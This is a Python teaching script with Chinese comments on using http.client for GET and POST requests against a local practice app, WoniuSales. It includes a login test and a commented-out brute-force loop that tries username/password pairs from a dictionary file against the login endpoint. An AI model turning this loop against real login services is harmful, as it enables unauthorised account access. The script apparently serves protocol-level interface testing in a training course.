# 利用http.client处理GET和POST请求

import http.client

# 总共三步：建议连接，发送请求，获取响应
# conn = http.client.HTTPConnection(host='localhost', port=8088)
# conn.request(method='GET', url='/woniusales/')
# resp = conn.getresponse()
# print(resp.read().decode())
# with open("D:/woniusales.html", mode='w+', encoding='utf-8') as file:
#     file.write(resp.read().decode())


# 利用GET请求下载一张图片
# conn = http.client.HTTPConnection('www.woniuxy.com', port=80)
# conn.request(method='GET', url='/page/img/banner/online-home.jpg')
# resp = conn.getresponse()
# with open("D:/online-home.jpg", mode='wb+') as file:
#     file.write(resp.read())
#


# 利用POST请求登录Woniusales，并完成断言
# 协议级接口测试的过程：建议连接，发送请求，获取响应，实现断言。
conn = http.client.HTTPConnection('localhost', 8088)
header = {'Content-Type':'application/x-www-form-urlencoded'}
body = 'username=admin&password=admin123&verifycode=0000'
conn.request(method='POST', url='/woniusales/user/login', body=body, headers=header)
resp = conn.getresponse()
print(resp.getheaders())
print('------------------------')
print(resp.getheader('Set-Cookie'))
if resp.read().decode() == 'login-pass':
    print("登录成功.")
else:
    print('登录失败.')


# 利用POST请求+彩虹字典实现暴力破解
# with open("D:/RainBow.txt") as file:
#     rainbow_list = file.readlines()
#
# for rainbow in rainbow_list:
#     username = rainbow.strip().split(',')[0]
#     password = rainbow.strip().split(',')[1]
#
#     conn = http.client.HTTPConnection('localhost', 8088)
#     header = {'Content-Type':'application/x-www-form-urlencoded'}
#     body = 'username=%s&password=%s&verifycode=0000' % (username, password)
#     conn.request(method='POST', url='/woniusales/user/login', body=body, headers=header)
#     resp = conn.getresponse()
#     if resp.read().decode() == 'login-pass':
#         print("登录成功，用户名为: %s, 密码为：%s" % (username, password))
#         break
#     else:
#         print("登录失败，用户名为: %s, 密码为：%s" % (username, password))


# 今日任务：
# 利用今日所学，基于HTTP协议和http.client去访问进销存的会员管理的首页并进行断言，同时再进行会员的新增，修改和查询操作。
# 如果遇到一些问题，则请预习Session和Cookie，尝试解决，如果没有问题，请思考，WoniuSales有没有问题？